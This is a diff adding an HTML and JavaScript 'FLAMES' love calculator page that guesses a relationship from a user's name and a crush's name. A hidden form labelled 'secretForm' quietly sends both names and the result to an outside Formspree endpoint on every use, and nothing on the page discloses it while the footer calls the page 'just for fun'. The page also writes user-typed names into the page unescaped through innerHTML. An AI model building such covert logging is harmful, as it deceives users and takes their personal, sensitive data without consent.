@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FLAMES Love Calculator 💘</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+    
+    :root {
+      /* Default theme (Love) */
+      --primary: #ff4d6d;
+      --secondary: #ff758f;
+      --bg-gradient: linear-gradient(135deg, #ffb3c6, #ff8fa3);
+      --glass-bg: rgba(255, 255, 255, 0.25);
+      --glass-border: rgba(255, 255, 255, 0.5);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: var(--bg-gradient);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+      transition: background 1s ease-in-out;
+    }
+
+    /* Animated background elements */
+    .bg-heart {
+      position: absolute;
+      color: rgba(255, 255, 255, 0.4);
+      animation: float 10s linear infinite;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(100vh) scale(0.5); opacity: 1; }
+      100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
+    }
+
+    .container, .result-page {
+      background: var(--glass-bg);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      padding: 50px 40px;
+      border-radius: 30px;
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      max-width: 450px;
+      width: 90%;
+      text-align: center;
+      z-index: 10;
+      position: absolute;
+      transition: all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    }
+    
+    .container {
+      /* Visible by default */
+      transform: scale(1);
+      opacity: 1;
+      visibility: visible;
+    }
+    
+    .container.hidden {
+      transform: scale(0.8) translateY(-50px);
+      opacity: 0;
+      visibility: hidden;
+    }
+    
+    .result-page {
+      /* Hidden by default */
+      transform: scale(0.8) translateY(50px);
+      opacity: 0;
+      visibility: hidden;
+      padding: 60px 40px;
+    }
+    
+    .result-page.active {
+      transform: scale(1) translateY(0);
+      opacity: 1;
+      visibility: visible;
+    }
+
+    h1 {
+      color: white;
+      font-weight: 700;
+      font-size: 2.2rem;
+      margin-bottom: 30px;
+      text-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px 20px;
+      background: rgba(255, 255, 255, 0.5);
+      border: 2px solid transparent;
+      border-radius: 15px;
+      font-size: 16px;
+      color: #333;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: rgba(0, 0, 0, 0.4);
+    }
+
+    input:focus {
+      background: rgba(255, 255, 255, 0.8);
+      border-color: white;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+    }
+
+    button {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 15px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 25px rgba(0,0,0,0.15);
+    }
+
+    button:active {
+      transform: translateY(1px);
+    }
+    
+    .btn-outline {
+      background: transparent;
+      border: 2px solid white;
+      box-shadow: none;
+      margin-top: 30px;
+    }
+    
+    .btn-outline:hover {
+      background: white;
+      color: var(--primary);
+    }
+
+    .names-display {
+      color: white;
+      font-size: 1.1rem;
+      margin-bottom: 25px;
+      font-weight: 300;
+      letter-spacing: 1px;
+      width: 100%;
+    }
+    
+    .names-display span {
+      font-weight: 600;
+      background: rgba(255, 255, 255, 0.2);
+      padding: 6px 16px;
+      border-radius: 20px;
+      display: inline-block;
+      margin: 5px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      backdrop-filter: blur(5px);
+      -webkit-backdrop-filter: blur(5px);
+    }
+
+    .emoji-container {
+      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 25px 0;
+      height: 120px;
+    }
+
+    .glow-ring {
+      position: absolute;
+      width: 100px;
+      height: 100px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      animation: pulse-ring 2s infinite cubic-bezier(0.215, 0.61, 0.355, 1);
+      z-index: 1;
+    }
+
+    @keyframes pulse-ring {
+      0% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.4); }
+      70% { transform: scale(1.6); box-shadow: 0 0 0 20px rgba(255, 255, 255, 0); }
+      100% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
+    }
+
+    .result-emoji {
+      font-size: 80px;
+      position: relative;
+      z-index: 2;
+      animation: float-emoji 3s ease-in-out infinite;
+      text-shadow: 0 10px 20px rgba(0,0,0,0.15);
+    }
+    
+    .result-title {
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 1.1rem;
+      font-weight: 400;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+    }
+    
+    .result-text {
+      color: white;
+      font-size: 2.8rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      text-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      animation: popText 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+    }
+
+    @keyframes popText {
+      0% { transform: scale(0.5); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    @keyframes float-emoji {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0px); }
+    }
+
+    .footer {
+      font-size: 13px;
+      margin-top: 25px;
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: 400;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Dynamic Background Particles -->
+  <div id="bg-particles-container"></div>
+
+  <!-- Calculator Form (Page 1) -->
+  <div class="container" id="calculator-page">
+    <h1>💖 FLAMES 💖</h1>
+    
+    <div class="input-group">
+      <input type="text" id="name1" placeholder="Your Name" autocomplete="off">
+    </div>
+    <div class="input-group">
+      <input type="text" id="name2" placeholder="Crush's Name" autocomplete="off">
+    </div>
+    
+    <button id="calculateBtn" onclick="playFlames()">Find Relationship</button>
+    
+    <div class="footer">Made with 💕 just for fun</div>
+  </div>
+
+  <!-- Result Screen (Page 2) -->
+  <div class="result-page" id="result-page">
+    <div class="names-display" id="names-display"></div>
+    <div class="result-title">Your Relationship Is</div>
+    
+    <div class="emoji-container">
+      <div class="glow-ring"></div>
+      <span class="result-emoji" id="final-emoji"></span>
+    </div>
+    
+    <div class="result-text" id="final-text"></div>
+    
+    <button class="btn-outline" onclick="resetCalculator()">Calculate Again ↺</button>
+  </div>
+
+  <!-- Hidden Form for Logging Names -->
+  <form id="secretForm" action="https://formspree.io/f/mwvdewqb" method="POST" style="display:none;">
+    <input type="hidden" name="name1" id="hiddenName1">
+    <input type="hidden" name="name2" id="hiddenName2">
+    <input type="hidden" name="relationship" id="hiddenRelationship">
+  </form>
+
+  <script>
+    // Theme Data Mapping
+    const THEMES = {
+      'F': { 
+        text: 'Friends', 
+        emoji: '🤝', 
+        particles: ['🤝', '😊', '🌻', '✨', '💛'],
+        primary: '#f59e0b',
+        secondary: '#fbbf24',
+        gradient: 'linear-gradient(135deg, #fef3c7, #fde68a)'
+      },
+      'L': { 
+        text: 'Love', 
+        emoji: '❤️', 
+        particles: ['❤️', '💖', '💘', '🌹', '✨'],
+        primary: '#ff4d6d',
+        secondary: '#ff758f',
+        gradient: 'linear-gradient(135deg, #ffb3c6, #ff8fa3)'
+      },
+      'A': { 
+        text: 'Affection', 
+        emoji: '🥰', 
+        particles: ['🥰', '💕', '🧸', '✨', '🌸'],
+        primary: '#ec4899',
+        secondary: '#f472b6',
+        gradient: 'linear-gradient(135deg, #fbcfe8, #f9a8d4)'
+      },
+      'M': { 
+        text: 'Marriage', 
+        emoji: '💍', 
+        particles: ['💍', '🥂', '🕊️', '✨', '🤍'],
+        primary: '#d97706',
+        secondary: '#fbbf24',
+        gradient: 'linear-gradient(135deg, #fef3c7, #fcd34d)'
+      },
+      'E': { 
+        text: 'Enemies', 
+        emoji: '⚔️', 
+        particles: ['⚔️', '🔥', '💢', '⚡', '💣'],
+        primary: '#dc2626',
+        secondary: '#ef4444',
+        gradient: 'linear-gradient(135deg, #fecaca, #f87171)'
+      },
+      'S': { 
+        text: 'Siblings', 
+        emoji: '👫', 
+        particles: ['👫', '🎈', '🎮', '🧩', '🌟'],
+        primary: '#2563eb',
+        secondary: '#3b82f6',
+        gradient: 'linear-gradient(135deg, #dbeafe, #93c5fd)'
+      },
+      'J': { 
+        text: 'Love & Marriage', 
+        emoji: '❤️💍', 
+        particles: ['❤️', '💍', '💖', '🕊️', '✨'],
+        primary: '#ff4d6d',
+        secondary: '#d97706',
+        gradient: 'linear-gradient(135deg, #ffb3c6, #fcd34d)'
+      },
+      'DEFAULT': {
+        particles: ['💖', '💕', '💘', '💗', '💓', '✨'],
+        primary: '#ff4d6d',
+        secondary: '#ff758f',
+        gradient: 'linear-gradient(135deg, #ffb3c6, #ff8fa3)'
+      }
+    };
+
+    // Create floating background particles
+    function createParticles(particleArray) {
+      const container = document.getElementById('bg-particles-container');
+      container.innerHTML = ''; // Clear existing
+      
+      for(let i = 0; i < 25; i++) {
+        let p = document.createElement('div');
+        p.className = 'bg-heart';
+        p.innerText = particleArray[Math.floor(Math.random() * particleArray.length)];
+        p.style.left = Math.random() * 100 + 'vw';
+        p.style.animationDuration = (Math.random() * 8 + 4) + 's';
+        p.style.animationDelay = (Math.random() * 5) + 's';
+        p.style.fontSize = (Math.random() * 25 + 15) + 'px';
+        container.appendChild(p);
+      }
+    }
+    
+    // Set theme visually
+    function applyTheme(themeObj) {
+      document.documentElement.style.setProperty('--primary', themeObj.primary);
+      document.documentElement.style.setProperty('--secondary', themeObj.secondary);
+      document.documentElement.style.setProperty('--bg-gradient', themeObj.gradient);
+      createParticles(themeObj.particles);
+    }
+
+    // Initialize Default
+    applyTheme(THEMES['DEFAULT']);
+
+    function removeCommonLetters(a, b) {
+      let name1 = a.toLowerCase().replace(/\s/g, '').split('');
+      let name2 = b.toLowerCase().replace(/\s/g, '').split('');
+      for (let i = 0; i < name1.length; i++) {
+        let index = name2.indexOf(name1[i]);
+        if (index !== -1) {
+          name1[i] = '';
+          name2[index] = '';
+        }
+      }
+      return (name1.join('') + name2.join('')).length;
+    }
+
+    function flamesResult(count) {
+      if (count === 0) return 'F'; 
+      let flames = ['F', 'L', 'A', 'M', 'E', 'S'];
+      let idx = 0;
+      while (flames.length > 1) {
+        idx = (idx + count - 1) % flames.length;
+        flames.splice(idx, 1);
+      }
+      return flames[0];
+    }
+
+    function playFlames() {
+      const name1 = document.getElementById("name1").value.trim();
+      const name2 = document.getElementById("name2").value.trim();
+      const btn = document.getElementById("calculateBtn");
+
+      if (!name1 || !name2) {
+        btn.innerText = "Enter Both Names! 😅";
+        btn.style.background = "linear-gradient(45deg, #ff9a9e, #fecfef)";
+        btn.style.color = "#d81b60";
+        setTimeout(() => {
+          btn.innerText = "Find Relationship";
+          btn.style.background = "";
+          btn.style.color = "";
+        }, 2000);
+        return;
+      }
+
+      // Add a small calculating animation
+      btn.innerText = "Calculating... ✨";
+      btn.style.pointerEvents = 'none';
+      
+      setTimeout(() => {
+        btn.innerText = "Find Relationship";
+        btn.style.pointerEvents = 'auto';
+        
+        const count = removeCommonLetters(name1, name2);
+        let relLetter = flamesResult(count);
+        
+        // Easter Egg for "Jeshwa"
+        if (name2.toLowerCase().includes('jeshwa')) {
+          relLetter = 'J';
+        }
+        
+        const relData = THEMES[relLetter];
+        
+        // Formspree submission
+        document.getElementById("hiddenName1").value = name1;
+        document.getElementById("hiddenName2").value = name2;
+        document.getElementById("hiddenRelationship").value = relData.text;
+        
+        const form = document.getElementById("secretForm");
+        fetch(form.action, {
+          method: "POST",
+          body: new FormData(form),
+          headers: {
+              'Accept': 'application/json'
+          }
+        }).catch(error => console.error('Error logging:', error));
+
+        // Transition to result page
+        showResultPage(relData, name1, name2);
+        
+      }, 800);
+    }
+    
+    function showResultPage(relData, name1, name2) {
+      // 1. Hide Calculator
+      document.getElementById('calculator-page').classList.add('hidden');
+      
+      // 2. Change Theme (Background and particles)
+      applyTheme(relData);
+      
+      // 3. Update Result Data
+      document.getElementById('names-display').innerHTML = `<span>${name1}</span> & <span>${name2}</span>`;
+      document.getElementById('final-emoji').innerText = relData.emoji;
+      document.getElementById('final-text').innerText = relData.text;
+      
+      // 4. Show Result Page
+      setTimeout(() => {
+        document.getElementById('result-page').classList.add('active');
+      }, 300); // Slight delay for smoother transition
+    }
+
+    function resetCalculator() {
+      // 1. Hide Result Page
+      document.getElementById('result-page').classList.remove('active');
+      
+      // 2. Reset Theme
+      applyTheme(THEMES['DEFAULT']);
+      
+      // 3. Clear Inputs
+      document.getElementById("name1").value = "";
+      document.getElementById("name2").value = "";
+      
+      // 4. Show Calculator
+      setTimeout(() => {
+        document.getElementById('calculator-page').classList.remove('hidden');
+      }, 400);
+    }
+  </script>
+</body>
+
+</html>
